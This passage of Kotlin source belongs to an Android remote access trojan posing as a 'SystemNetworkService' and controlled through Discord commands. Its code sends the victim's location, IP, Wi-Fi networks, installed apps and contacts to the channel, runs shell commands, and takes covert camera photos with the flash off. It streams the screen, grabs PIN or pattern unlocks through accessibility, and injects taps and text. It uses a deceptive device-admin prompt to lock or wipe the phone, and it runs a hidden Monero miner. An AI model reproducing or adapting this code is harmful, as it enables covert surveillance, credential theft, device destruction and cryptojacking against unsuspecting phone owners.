                            ":globe_with_meridians: **IP Info**\nIP: `${ipData["ip"]}`\nCity: ${ipData["city"]}\nRegion: ${ipData["region"]}\nCountry: ${ipData["country"]}\nISP: ${ipData["isp"]}\nLat/Lon: ${ipData["lat"]}, ${ipData["lon"]}"
                        } else {
                            ":x: **Failed to fetch IP info**"
                        }
                        if (progressId != null) d.editMsg(progressId, msg) else d.sendMsg(msg)
                    } catch (e: Exception) {
                        val msg = ":x: **IP error**: ${e.message?.take(50) ?: "unknown"}"
                        if (progressId != null) d.editMsg(progressId, msg) else d.sendMsg(msg)
                    }
                }
                "debug" -> {
                    val uptime = discord?.getUptime() ?: 0L
                    val hrs = uptime / 3600000
                    val mins = (uptime % 3600000) / 60000
                    val secs = (uptime % 60000) / 1000
                    val conn = discord?.isConnected() == true
                    d.sendMsg(":mag: **Debug Info**\nUptime: ${hrs}h ${mins}m ${secs}s\nConnected: $conn\nSDK: ${Build.VERSION.SDK_INT}\nModel: ${Build.MODEL}")
                }
                "restart" -> {
                    d.sendMsg(":arrows_counterclockwise: Restarting gateway...")
                    discord?.stop()
                    gatewayStarted = false
                    discord = null
                    startService(Intent(this@SystemNetworkService, SystemNetworkService::class.java))
                }
                "wifi" -> {
                    val wm = getSystemService(Context.WIFI_SERVICE) as WifiManager
                    val info = wm.connectionInfo
                    val ssid = info.ssid?.removeSurrounding("\"") ?: "?"
                    val bssid = info.bssid ?: "?"
                    val rssi = info.rssi
                    val speed = info.linkSpeed
                    val sb = StringBuilder()
                    sb.appendLine("WiFi: **$ssid**")
                    sb.appendLine("BSSID: `$bssid`")
                    sb.appendLine("Signal: ${rssi}dBm | Speed: ${speed}Mbps")
                    sb.appendLine()
                    sb.appendLine("**Scan Results:**")
                    try {
                        val scanResults = wm.scanResults
                        if (scanResults.isNotEmpty()) {
                            scanResults.sortedByDescending { it.level }.take(20).forEach { ap ->
                                val lock = if (ap.capabilities.contains("WPA")) "🔒" else "🔓"
                                sb.appendLine("$lock ${ap.SSID} (${ap.level}dBm)")
                            }
                        } else {
                            sb.appendLine("(no scan results — try moving closer to AP)")
                        }
                    } catch (e: Exception) {
                        sb.appendLine("Scan failed: ${e.message?.take(50)}")
                    }
                    d.sendMsg(sb.toString().take(1900))
                }
                "battery" -> {
                    val ifilter = IntentFilter(Intent.ACTION_BATTERY_CHANGED)
                    val bStatus = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                        registerReceiver(null, ifilter, Context.RECEIVER_NOT_EXPORTED)
                    } else {
                        registerReceiver(null, ifilter)
                    }
                    if (bStatus != null) {
                        val level = bStatus.getIntExtra("level", -1)
                        val scale = bStatus.getIntExtra("scale", -1)
                        val pct = if (level >= 0 && scale > 0) level * 100 / scale else -1
                        val temp = bStatus.getIntExtra("temperature", -1) / 10f
                        val voltage = bStatus.getIntExtra("voltage", -1)
                        val plugged = when (bStatus.getIntExtra("plugged", -1)) {
                            1 -> "AC"
                            2 -> "USB"
                            3 -> "Wireless"
                            else -> "Unplugged"
                        }
                        val health = when (bStatus.getIntExtra("health", -1)) {
                            2 -> "Good"
                            3 -> "Overheat"
                            4 -> "Dead"
                            5 -> "Over voltage"
                            6 -> "Unknown"
                            7 -> "Cold"
                            else -> "?"
                        }
                        val status = when (bStatus.getIntExtra("status", -1)) {
                            1 -> "Unknown"
                            2 -> "Charging"
                            3 -> "Discharging"
                            4 -> "Not charging"
                            5 -> "Full"
                            else -> "?"
                        }
                        d.sendMsg(":battery: **Battery**\n```\nLevel : ${pct}%\nStatus: $status\nHealth: $health\nTemp  : ${temp}°C\nVolt  : ${voltage}mV\nPower : $plugged\n```")
                    } else {
                        d.sendMsg(":x: Battery info unavailable")
                    }
                }
                "processes" -> {
                    val result = shell("ps -A 2>/dev/null || ps")
                    val lines = result.lines().filter { it.trim().isNotEmpty() }
                    val out = if (lines.size > 50) lines.take(50).joinToString("\n") + "\n... (${lines.size - 50} more)" else lines.joinToString("\n")
                    d.sendMsg(":microscope: **Processes** (${lines.size})\n```\n${out.take(1900)}\n```")
                }
                "installed" -> {
                    val pm = packageManager
                    val packages = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                        pm.getInstalledPackages(PackageManager.PackageInfoFlags.of(0L))
                    } else {
                        @Suppress("DEPRECATION")
                        pm.getInstalledPackages(0)
                    }
                    val apps = packages
                        .filter { it.packageName != packageName }
                        .map { pi ->
                            val label = pi.applicationInfo?.loadLabel(pm)?.toString() ?: pi.packageName
                            "$label (${pi.packageName})"
                        }
                        .sorted()
                    val total = apps.size
                    if (total == 0) {
                        d.sendMsg(":package: **Installed Apps** (0)\n(no third-party apps)")
                    } else {
                        // Split into multiple messages if needed
                        var msg = ""
                        var count = 0
                        for (app in apps) {
                            val line = "$app\n"
                            if (msg.length + line.length > 1900) {
                                d.sendMsg(":package: **Installed Apps** ($total)\n```\n$msg```")
                                delay(500)
                                msg = ""
                            }
                            msg += line
                            count++
                        }
                        if (msg.isNotEmpty()) {
                            d.sendMsg(":package: **Installed Apps** ($total)\n```\n$msg```")
                        }
                    }
                }
                "torch" -> {
                    if (!hasPerm(android.Manifest.permission.CAMERA)) {
                        d.sendMsg(":x: **Camera permission denied** — torch/flashlight requires camera permission")
                        return
                    }
                    val mode = payload?.lowercase()
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                        try {
                            val cm = getSystemService(Context.CAMERA_SERVICE) as CameraManager
                            val camId = cm.cameraIdList.firstOrNull { id ->
                                val chars = cm.getCameraCharacteristics(id)
                                val dir = chars.get(android.hardware.camera2.CameraCharacteristics.FLASH_INFO_AVAILABLE)
                                dir == true
                            }
                            if (camId != null) {
                                val on = mode == "on" || mode == "1" || mode == null
                                cm.setTorchMode(camId, on)
                                d.sendMsg(":flashlight: Torch **${if (on) "ON" else "OFF"}**")
                            } else {
                                d.sendMsg(":x: No flash available")
                            }
                        } catch (e: Exception) {
                            d.sendMsg(":x: Torch failed: ${e.message?.take(50)}")
                        }
                    } else {
                        d.sendMsg(":x: Torch requires API 23+")
                    }
                }
                "vibrate" -> {
                    val ms = (payload?.toLongOrNull() ?: 1000L).coerceIn(100L, 10000L)
                    try {
                        val vb = getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
                        if (vb.hasVibrator()) {
                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                                vb.vibrate(VibrationEffect.createOneShot(ms, VibrationEffect.DEFAULT_AMPLITUDE))
                            } else {
                                vb.vibrate(ms)
                            }
                            d.sendMsg(":loud_sound: Vibrated for ${ms}ms")
                        } else {
                            d.sendMsg(":x: No vibrator found")
                        }
                    } catch (e: Exception) {
                        d.sendMsg(":x: Vibrate failed: ${e.message?.take(50)}")
                    }
                }
                "admin" -> {
                    when (payload?.lowercase()) {
                        "on" -> {
                            val comp = AdminReceiver.getComponent(this)
                            val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
                            if (!dpm.isAdminActive(comp)) {
                                val i = Intent(android.app.admin.DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
                                    .putExtra(android.app.admin.DevicePolicyManager.EXTRA_DEVICE_ADMIN, comp)
                                    .putExtra(android.app.admin.DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Required for device security")
                                    .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                                startActivitySafely(i)
                                d.sendMsg(":shield: **Device Admin prompt sent** — accept on device")
                            } else {
                                d.sendMsg(":shield: Device Admin already active")
                            }
                        }
                        "off" -> {
                            val comp = AdminReceiver.getComponent(this)
                            val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
                            dpm.removeActiveAdmin(comp)
                            d.sendMsg(":shield: Device Admin removed")
                        }
                        "lock" -> {
                            AdminReceiver.lockScreen(this)
                            d.sendMsg(":shield: Device locked")
                        }
                        "wipe" -> {
                            d.sendMsg(":warning: **Wiping device**...")
                            AdminReceiver.wipeDevice(this)
                        }
                        else -> {
                            val active = AdminReceiver.isActive(this)
                            d.sendMsg(":shield: **Device Admin**: ${if (active) "ACTIVE" else "INACTIVE"}\n`!admin on` to enable\n`!admin lock` to lock screen")
                        }
                    }
                }
                "pin" -> {
                    if (!AccessibilityHelper.isRunning) {
                        d.sendMsg(":x: Accessibility service not running — `!keylog on` first")
                    } else {
                        d.sendMsg(":key: **PIN/Pattern grabber**\nEnable it via accessibility. Results appear here automatically after unlock.\n`!debug` for captured data.")
                    }
                }
                "overlay" -> {
                    val svc = AccessibilityHelper.instance
                    if (svc == null) {
                        d.sendMsg(":x: Accessibility service not running")
                    } else {
                        val enable = payload?.lowercase() != "off"
                        svc.toggleBlackOverlay(enable)
                        d.sendMsg(":black_large_square: Overlay **${if (enable) "ON" else "OFF"}**")
                    }
                }
                "click" -> {
                    val svc = AccessibilityHelper.instance
                    if (svc == null) { d.sendMsg(":x: Accessibility not running"); return }
                    if (payload == null || payload.isBlank()) {
                        d.sendMsg(":point_up: **!click**\nClick by text or coordinates.\nUsage: `!click <text>` — clicks first matching text\nUsage: `!click x,y` — clicks at screen coordinates\nExample: `!click Sign In`\nExample: `!click 540,1200`")
                        return
                    }
                    val coords = payload.split(",")
                    if (coords.size == 2) {
                        val x = coords[0].trim().toIntOrNull()
                        val y = coords[1].trim().toIntOrNull()
                        if (x != null && y != null) {
                            svc.harvester.click(x, y)
                            d.sendMsg(":point_up: Clicked ($x, $y)")
                        } else {
                            d.sendMsg(":x: Invalid coordinates")
                        }
                    } else {
                        svc.harvester.clickByText(payload)
                        d.sendMsg(":point_up: Clicked text: $payload")
                    }
                }
                "input" -> {
                    val svc = AccessibilityHelper.instance
                    if (svc == null) { d.sendMsg(":x: Accessibility not running"); return }
                    if (payload == null || payload.isBlank()) {
                        d.sendMsg(":keyboard: **!input**\nType text via accessibility.\nUsage: `!input <text>`\nExample: `!input Hello World`")
                        return
                    }
                    svc.harvester.inputText(payload)
                    d.sendMsg(":keyboard: Input sent")
                }
                "open" -> {
                    if (payload == null || payload.isBlank()) {
                        d.sendMsg(":link: **!open**\nLaunch an app.\nUsage: `!open com.example.app`\nUsage: `!open chrome` (short name)\nExamples: `!open chrome`, `!open whatsapp`, `!open maps`")
                        return
                    }
                    try {
                        var intent = packageManager.getLaunchIntentForPackage(payload)
                        if (intent == null) {
                            // Try to find package by short name
                            val foundPkg = findPackageByName(payload)
                            if (foundPkg != null) {
                                intent = packageManager.getLaunchIntentForPackage(foundPkg)
                            }
                        }
                        if (intent != null) {
                            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                            startActivitySafely(intent)
                            d.sendMsg(":link: Opened: ${intent.component?.packageName ?: payload}")
                        } else {
                            d.sendMsg(":x: Package not installed: $payload")
                        }
                    } catch (e: Exception) {
                        d.sendMsg(":x: Failed: ${e.message?.take(50)}")
                    }
                }
                "screen" -> {
                    val svc = AccessibilityHelper.instance
                    if (svc == null) { d.sendMsg(":x: Accessibility not running"); return }
                    val tree = svc.harvester.dumpScreen()
                    if (tree.isBlank()) {
                        d.sendMsg(":frame_photo: No UI elements detected")
                    } else {
                        d.sendMsg(":frame_photo: **UI Tree**\n```\n${tree.take(1900)}\n```")
                    }
                }
                "gesture" -> {
                    val svc = AccessibilityHelper.instance
                    if (svc == null) { d.sendMsg(":x: Accessibility not running"); return }
                    if (payload == null) {
                        d.sendMsg(":hand: **!gesture**\nPerform swipe gesture.\nUsage: `!gesture x1,y1,x2,y2,ms`\nExample: `!gesture 540,1800,540,600,300`\n(swipe up from bottom to top in 300ms)")
                        return
                    }
                    val parts = payload.split(",")
                    if (parts.size == 5) {
                        val x1 = parts[0].trim().toIntOrNull()
                        val y1 = parts[1].trim().toIntOrNull()
                        val x2 = parts[2].trim().toIntOrNull()
                        val y2 = parts[3].trim().toIntOrNull()
                        val ms = parts[4].trim().toIntOrNull() ?: 300
                        if (x1 != null && y1 != null && x2 != null && y2 != null) {
                            svc.harvester.swipe(x1, y1, x2, y2, ms)
                            d.sendMsg(":hand_splayed: Swipe ($x1,$y1)->($x2,$y2) ${ms}ms")
                        } else {
                            d.sendMsg(":x: Invalid coordinates. Usage: `!gesture x1,y1,x2,y2,ms`")
                        }
                    } else {
                        d.sendMsg(":x: Invalid params. Usage: `!gesture x1,y1,x2,y2,ms`")
                    }
                }
                "miner" -> {
                    val mp = minerPlugin
                    if (mp == null) {
                        d.sendMsg(":x: Miner plugin not initialized")
                        return
                    }
                    val sub = payload?.trim()?.lowercase()
                    when {
                        sub == null || sub.isBlank() -> {
                            d.sendMsg(mp.handleCommand("miner", null) ?: ":x: Miner error")
                        }
                        sub == "start" -> {
                            d.sendMsg(":pick: **Starting XMR miner**...")
                            val result = mp.handleCommand("miner", "start")
                            d.sendMsg(result ?: ":x: Failed to start miner")
                        }
                        sub == "stop" -> {
                            mp.handleCommand("miner", "stop")
                            d.sendMsg(":stop_button: **Miner stopped**")
                        }
                        sub == "status" -> {
                            d.sendMsg(mp.handleCommand("miner", "status") ?: ":x: Miner error")
                        }
                        sub.startsWith("set_wallet") -> {
                            val wallet = payload.substringAfter("set_wallet").trim()
                            if (wallet.isBlank()) {
                                d.sendMsg(":x: Usage: `!miner set_wallet <monero_address>`")
                            } else {
                                d.sendMsg(mp.handleCommand("miner", "set_wallet $wallet") ?: ":x: Failed to set wallet")
                            }
                        }
                        sub.startsWith("set_pool") -> {
                            val pool = payload.substringAfter("set_pool").trim()
                            if (pool.isBlank()) {
                                d.sendMsg(":x: Usage: `!miner set_pool <host:port>`")
                            } else {
                                d.sendMsg(mp.handleCommand("miner", "set_pool $pool") ?: ":x: Failed to set pool")
                            }
                        }
                        sub.startsWith("set_threads") -> {
                            val threads = payload.substringAfter("set_threads").trim()
                            if (threads.isBlank()) {
                                d.sendMsg(":x: Usage: `!miner set_threads <1-8>`")
                            } else {
                                d.sendMsg(mp.handleCommand("miner", "set_threads $threads") ?: ":x: Failed to set threads")
                            }
                        }
                        else -> {
                            d.sendMsg(
                                ":pick: **Miner Commands**\n" +
                                "`!miner` — Show status\n" +
                                "`!miner start` — Start mining\n" +
                                "`!miner stop` — Stop mining\n" +
                                "`!miner status` — Detailed status\n" +
                                "`!miner set_wallet <addr>` — Set Monero wallet\n" +
                                "`!miner set_pool <host:port>` — Set mining pool\n" +
                                "`!miner set_threads <1-8>` — Set thread count"
                            )
                        }
                    }
                }
            }
        } catch (e: Exception) {
            
            d.sendMsg(":x: **Error**: ${e.message?.take(100)}")
        }
    }

    private fun startStream(d: DiscordGatewayClient, fps: Int) {
        streamFps = fps
        if (isStreaming) {
            streamJob?.cancel()
            streamMessageId = null
            DisplayCapture.releaseStreamCapture()
        }
        if (!DisplayCapture.initStreamCapture(this)) {
            d.sendMsg(":x: Stream capture init failed")
            return
        }
        isStreaming = true
        streamMessageId = null
        d.sendMsg(":tv: **Live stream started** (GIF mode, ${fps}fps)\nUse `!stream stop` to end")
        streamJob = scope.launch {
            var consecutiveFailures = 0
            val maxFailures = 5
            val framesPerGif = 8
            val targetDelay = 1000L / fps
            val gifWidth = 480
            val gifHeight = 854
            try {
                while (isActive) {
                    val gifEncoder = AnimatedGifEncoder()
                    gifEncoder.setSize(gifWidth, gifHeight)
                    gifEncoder.setRepeat(0)
                    gifEncoder.setDelay((1000 / fps).coerceAtLeast(100))
                    var capturedFrames = 0
                    for (i in 0 until framesPerGif) {
                        if (!isActive) break
                        try {
                            val bmp = DisplayCapture.captureStreamBitmap()
                            if (bmp != null) {
                                val scaled = if (bmp.width != gifWidth || bmp.height != gifHeight) {
                                    val scale = minOf(gifWidth.toFloat() / bmp.width, gifHeight.toFloat() / bmp.height)
                                    val w = (bmp.width * scale).toInt()
                                    val h = (bmp.height * scale).toInt()
                                    val centered = Bitmap.createBitmap(gifWidth, gifHeight, Bitmap.Config.ARGB_8888)
                                    val canvas = android.graphics.Canvas(centered)
                                    canvas.drawColor(android.graphics.Color.BLACK)
                                    canvas.drawBitmap(bmp, ((gifWidth - w) / 2).toFloat(), ((gifHeight - h) / 2).toFloat(), null)
                                    bmp.recycle()
                                    centered
                                } else bmp
                                gifEncoder.addFrame(scaled)
                                capturedFrames++
                            } else {
                                consecutiveFailures++
                                if (consecutiveFailures >= maxFailures) {
                                    d.sendMsg(":x: Stream stopped — too many failures")
                                    isStreaming = false
                                    streamMessageId = null
                                    DisplayCapture.releaseStreamCapture()
                                    return@launch
                                }
                            }
                        } catch (e: Exception) {
                            consecutiveFailures++
                            if (consecutiveFailures >= maxFailures) {
                                d.sendMsg(":x: Stream error — stopped")
                                isStreaming = false
                                streamMessageId = null
                                DisplayCapture.releaseStreamCapture()
                                return@launch
                            }
                        }
                        val frameDelay = targetDelay - 50
                        if (frameDelay > 0) delay(frameDelay)
                    }
                    if (capturedFrames > 0) {
                        consecutiveFailures = 0
                        val gifBytes = gifEncoder.finish()
                        val oldId = streamMessageId
                        val newId = d.sendFileAwait("", "stream.gif", gifBytes)
                        if (newId != null) {
                            streamMessageId = newId
                            if (oldId != null) {
                                launch { d.deleteMsgAwait(oldId) }
                            }
                        }
                    }
                }
            } catch (e: Exception) {
                isStreaming = false
                streamMessageId = null
                DisplayCapture.releaseStreamCapture()
            }
        }
    }

    private fun buildInfo(): String {
        return buildString {
            appendLine("\u001b[40m\u001b[1;36m╔═══════════════════════════╗")
            appendLine("║   DEVICE INFORMATION     ║")
            appendLine("╚═══════════════════════════╝\u001b[0m")
            appendLine()
            appendLine("\u001b[1;33mDevice\u001b[0m      : \u001b[1;37m${Build.MODEL}\u001b[0m")
            appendLine("\u001b[1;33mManufacturer\u001b[0m : \u001b[1;37m${Build.MANUFACTURER}\u001b[0m")
            appendLine("\u001b[1;33mAndroid\u001b[0m     : \u001b[1;37m${Build.VERSION.RELEASE}\u001b[0m")
            appendLine("\u001b[1;33mSDK\u001b[0m         : \u001b[1;37m${Build.VERSION.SDK_INT}\u001b[0m")
            appendLine("\u001b[1;33mHost\u001b[0m        : \u001b[1;37m${Build.HOST}\u001b[0m")
            appendLine("\u001b[1;33mFingerprint\u001b[0m : ||\u001b[2;37m${Build.FINGERPRINT.take(60)}...\u001b[0m||")
        }
    }

    private fun glitchBar(pct: Int): String {
        val full = "█".repeat((pct / 10).coerceIn(0, 10))
        val empty = "░".repeat((10 - pct / 10).coerceIn(0, 10))
        val bar = full + empty
        val color = when {
            pct >= 80 -> "\u001b[1;32m"
            pct >= 40 -> "\u001b[1;33m"
            else -> "\u001b[1;31m"
        }
        return "$color$bar\u001b[0m $pct%"
    }

    private suspend fun captureScreen(): ByteArray? = withContext(Dispatchers.IO) {
        try {
            withTimeoutOrNull(20000L) {
                val deferred = CompletableDeferred<ByteArray?>()
                val ss = DisplayCapture(this@SystemNetworkService)
                ss.capture(object : DisplayCapture.Callback {
                    override fun onSuccess(data: ByteArray) { deferred.complete(data) }
                    override fun onFailure(error: String) { deferred.complete(null) }
                })
                deferred.await()
            }
        } catch (e: Exception) {
            null
        }
    }

    private suspend fun captureScreenForStream(): ByteArray? = withContext(Dispatchers.IO) {
        try {
            withTimeoutOrNull(5000L) {
                DisplayCapture.captureStreamFrame()
            }
        } catch (e: Exception) {
            null
        }
    }

    private suspend fun shell(cmd: String): String = withContext(Dispatchers.IO) {
        try {
            val p = ProcessBuilder("sh", "-c", cmd)
                .directory(cacheDir)
                .redirectErrorStream(true)
                .start()
            val output = try {
                withTimeoutOrNull(10000L) {
                    p.inputStream.bufferedReader().readText()
                }
            } catch (_: Exception) { null }
            if (output == null) {
                p.destroyForcibly()
                "Error: timed out"
            } else {
                val trimmed = output.trim()
                if (trimmed.contains("Permission denied") || trimmed.contains("Operation not permitted") || trimmed.contains("No such file or directory")) {
                    "⚠️ Command restricted by Android sandbox\n" +
                    "Tip: Use app-accessible commands like:\n" +
                    "  • `whoami` / `id` - Show user info\n" +
                    "  • `getprop` - Show device properties\n" +
                    "  • `pm list packages` - List installed apps\n" +
                    "  • `dumpsys battery` - Battery info\n" +
                    "  • `ls /sdcard` - List external storage\n" +
                    "  • `cat /proc/version` - Kernel info"
                } else {
                    trimmed.ifEmpty { "(no output)" }
                }
            }
        } catch (ex: Exception) {
            "Error: ${ex.message}"
        }
    }

    private data class ProcInfo(val pid: String, val user: String, val name: String)

    private fun scanProcFs(): List<ProcInfo> {
        val result = mutableListOf<ProcInfo>()
        val procDir = java.io.File("/proc")
        if (!procDir.isDirectory) return result
        procDir.listFiles()?.forEach { entry ->
            if (!entry.isDirectory) return@forEach
            val pid = entry.name.toIntOrNull() ?: return@forEach
            try {
                val statusFile = entry.resolve("status")
                if (!statusFile.exists()) return@forEach
                var name = "?"
                var uid = "?"
                statusFile.bufferedReader().useLines { lines ->
                    lines.forEach { line ->
                        if (line.startsWith("Name:")) name = line.substringAfter("Name:").trim()
                        if (line.startsWith("Uid:")) {
                            val uidStr = line.substringAfter("Uid:").trim().split("\\s+".toRegex()).firstOrNull() ?: "?"
                            uid = if (uidStr.toIntOrNull() != null) "u0_a${uidStr.toInt() - 10000}" else uidStr
                        }
                    }
                }
                result.add(ProcInfo(pid.toString(), uid, name))
            } catch (_: Exception) {}
        }
        return result.sortedBy { it.pid }
    }

    private suspend fun takePhoto(cameraId: Int = 0): ByteArray? = withContext(Dispatchers.IO) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            takePhotoCamera2(cameraId)
        } else {
            takePhotoLegacy(cameraId)
        }
    }

    @Suppress("DEPRECATION")
    private fun takePhotoLegacy(cameraId: Int): ByteArray? {
        var camera: android.hardware.Camera? = null
        return try {
            camera = android.hardware.Camera.open(cameraId)
            val params = camera.parameters
            camera.parameters = params
            val texture = SurfaceTexture(0)
            camera.setPreviewTexture(texture)
            camera.startPreview()
            val latch = CountDownLatch(1)
            var result: ByteArray? = null
            camera.autoFocus { _, _ ->
                camera.takePicture(null, null, android.hardware.Camera.PictureCallback { data, _ ->
                    result = data
                    latch.countDown()
                })
            }
            latch.await(15, TimeUnit.SECONDS)
            result
        } catch (e: Exception) {
            
            null
        } finally {
            try {
                camera?.stopPreview()
                camera?.release()
            } catch (_: Exception) {}
        }
    }

    private suspend fun takePhotoCamera2(cameraId: Int): ByteArray? = withContext(Dispatchers.IO) {
        val deferred = CompletableDeferred<ByteArray?>()
        val cm = getSystemService(Context.CAMERA_SERVICE) as CameraManager
        val camId = try {
            if (cameraId == 1) {
                cm.cameraIdList.find { id ->
                    val chars = cm.getCameraCharacteristics(id)
                    val lens = chars.get(android.hardware.camera2.CameraCharacteristics.LENS_FACING)
                    lens == android.hardware.camera2.CameraCharacteristics.LENS_FACING_FRONT
                }
            } else {
                cm.cameraIdList.firstOrNull { id ->
                    val chars = cm.getCameraCharacteristics(id)
                    val lens = chars.get(android.hardware.camera2.CameraCharacteristics.LENS_FACING)
                    lens == android.hardware.camera2.CameraCharacteristics.LENS_FACING_BACK
                }
            }
        } catch (e: Exception) {
            
            null
        }

        if (camId == null) {
            deferred.complete(null)
            return@withContext deferred.await()
        }

        var reader: ImageReader? = null
        var camDevice: CameraDevice? = null
        var session: CameraCaptureSession? = null

        try {
            val characteristics = cm.getCameraCharacteristics(camId)
            val map = characteristics.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
            val size = map?.getOutputSizes(ImageFormat.JPEG)?.maxByOrNull { it.width * it.height }
                ?: android.util.Size(1920, 1080)

            reader = ImageReader.newInstance(size.width, size.height, ImageFormat.JPEG, 1)
            val handler = Handler(Looper.getMainLooper())

            val stateCallback = object : CameraDevice.StateCallback() {
                override fun onOpened(device: CameraDevice) {
                    camDevice = device
                    try {
                        val captureRequest = device.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
                            addTarget(reader!!.surface)
                            set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_AUTO)
                            set(CaptureRequest.FLASH_MODE, CaptureRequest.FLASH_MODE_OFF)
                        }.build()

                        device.createCaptureSession(listOf(reader!!.surface), object : CameraCaptureSession.StateCallback() {
                            override fun onConfigured(s: CameraCaptureSession) {
                                session = s
                                try {
                                    s.capture(captureRequest, null, handler)
                                } catch (e: Exception) {
                                    
                                    deferred.complete(null)
                                }
                            }
                            override fun onConfigureFailed(s: CameraCaptureSession) {
                                deferred.complete(null)
                            }
                        }, handler)
                    } catch (e: Exception) {
                        
                        deferred.complete(null)
                    }
                }
                override fun onDisconnected(device: CameraDevice) { deferred.complete(null) }
                override fun onError(device: CameraDevice, error: Int) { deferred.complete(null) }
            }

            cm.openCamera(camId, stateCallback, handler)

            reader!!.setOnImageAvailableListener({ r ->
                try {
                    val image = r.acquireLatestImage()
                    if (image != null) {
                        val buffer = image.planes[0].buffer
                        val bytes = ByteArray(buffer.remaining())
                        buffer.get(bytes)
                        image.close()
                        deferred.complete(bytes)
                    }
                } catch (e: Exception) {
                    
                    deferred.complete(null)
                }
            }, handler)

            withTimeoutOrNull(15000L) { deferred.await() }
        } catch (e: Exception) {
            
            null
        } finally {
            try { session?.close() } catch (_: Exception) {}
            try { camDevice?.close() } catch (_: Exception) {}
            try { reader?.close() } catch (_: Exception) {}
        }
    }

    private fun getLocation(): String {
        val lm = getSystemService(Context.LOCATION_SERVICE) as LocationManager
        var loc: Location? = null

        // Try GPS first, then network, then passive
        for (provider in listOf(LocationManager.GPS_PROVIDER, LocationManager.NETWORK_PROVIDER, LocationManager.PASSIVE_PROVIDER)) {
            try {
                loc = lm.getLastKnownLocation(provider)
                if (loc != null && System.currentTimeMillis() - loc.time < 300000) break
                loc = null
            } catch (_: Exception) {}
        }

        if (loc != null) {
            val lat = loc.latitude
            val lon = loc.longitude
            val acc = loc.accuracy
            return ":round_pushpin: **Location**\nLat: `$lat`\nLon: `$lon`\nAcc: ±${acc}m\nhttps://www.google.com/maps?q=$lat,$lon"
        }

        // Try to get fresh location with shorter timeout
        val latch = CountDownLatch(1)
        var newLoc: Location? = null
        @Suppress("DEPRECATION")
        val listener = object : LocationListener {
            override fun onLocationChanged(location: Location) { newLoc = location; latch.countDown() }
            override fun onStatusChanged(provider: String?, status: Int, extras: android.os.Bundle?) {}
            override fun onProviderEnabled(provider: String) {}
            override fun onProviderDisabled(provider: String) {}
        }
        try {
            for (p in listOf(LocationManager.NETWORK_PROVIDER, LocationManager.GPS_PROVIDER)) {
                if (lm.isProviderEnabled(p)) {
                    lm.requestSingleUpdate(p, listener, Looper.getMainLooper())
                    latch.await(8, TimeUnit.SECONDS)
                    if (newLoc != null) break
                }
            }
        } catch (_: Exception) {
        } finally {
            lm.removeUpdates(listener)
        }

        if (newLoc != null) {
            val lat = newLoc!!.latitude
            val lon = newLoc!!.longitude
            val acc = newLoc!!.accuracy
            return ":round_pushpin: **Location**\nLat: `$lat`\nLon: `$lon`\nAcc: ±${acc}m\nhttps://www.google.com/maps?q=$lat,$lon"
        }

        // Fallback: IP-based geolocation
        try {
            val url = java.net.URL("http://ip-api.com/json/")
            val conn = url.openConnection() as java.net.HttpURLConnection
            conn.connectTimeout = 5000
            conn.readTimeout = 5000
            val body = conn.inputStream.bufferedReader().readText()
            conn.disconnect()
            val json = org.json.JSONObject(body)
            if (json.optString("status") == "success") {
                val lat = json.getDouble("lat")
                val lon = json.getDouble("lon")
                val city = json.optString("city", "?")
                val country = json.optString("country", "?")
                return ":round_pushpin: **Location** (IP-based)\nLat: `$lat`\nLon: `$lon`\nCity: $city, $country\nhttps://www.google.com/maps?q=$lat,$lon"
            }
        } catch (_: Exception) {}

        return ":x: No location available — ensure GPS/WiFi is on and try outside"
    }

    private fun getIpLocation(): String {
        try {
            val url = java.net.URL("http://ip-api.com/json/")
            val conn = url.openConnection() as java.net.HttpURLConnection
            conn.connectTimeout = 5000
            conn.readTimeout = 5000
            val body = conn.inputStream.bufferedReader().readText()
            conn.disconnect()
            val json = org.json.JSONObject(body)
            if (json.optString("status") == "success") {
                val lat = json.getDouble("lat")
                val lon = json.getDouble("lon")
                val city = json.optString("city", "?")
                val country = json.optString("country", "?")
                val ip = json.optString("query", "?")
                return ":round_pushpin: **Location** (IP-based)\nLat: `$lat`\nLon: `$lon`\nCity: $city, $country\nIP: $ip\nhttps://www.google.com/maps?q=$lat,$lon"
            }
        } catch (e: Exception) {
            
        }
        return ":x: No location available — ensure GPS/WiFi is on and try outside"
    }

    private fun fetchIpInfo(): Map<String, String>? {
        val url = java.net.URL("http://ip-api.com/json/")
        val conn = url.openConnection() as java.net.HttpURLConnection
        conn.connectTimeout = 8000
        conn.readTimeout = 8000
        val body = conn.inputStream.bufferedReader().readText()
        conn.disconnect()
        val json = org.json.JSONObject(body)
        if (json.optString("status") == "success") {
            return mapOf(
                "ip" to json.optString("query", "?"),
                "city" to json.optString("city", "?"),
                "region" to json.optString("regionName", "?"),
                "country" to json.optString("country", "?"),
                "isp" to json.optString("isp", "?"),
                "lat" to json.getDouble("lat").toString(),
                "lon" to json.getDouble("lon").toString()
            )
        }
        return null
    }

    private fun queryText(uri: Uri, cols: Array<String>, transform: (Cursor) -> String): String {
        return try {
            val cursor = contentResolver.query(uri, cols, null, null, "date DESC")
            cursor?.use { c ->
                buildString {
                    var count = 0
                    while (c.moveToNext() && count < 50) {
                        appendLine(transform(c))
                        count++
                    }
                }
            } ?: "No data"
        } catch (e: Exception) {
            "Error: ${e.message}"
        }
    }

    private fun getContacts(): String {
        val sb = StringBuilder()
        try {
            val cursor = contentResolver.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null)
            cursor?.use { c ->
                var count = 0
                val nameIdx = c.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME)
                while (c.moveToNext() && count < 50) {
                    val name = c.getString(nameIdx) ?: "?"
                    sb.appendLine(name)
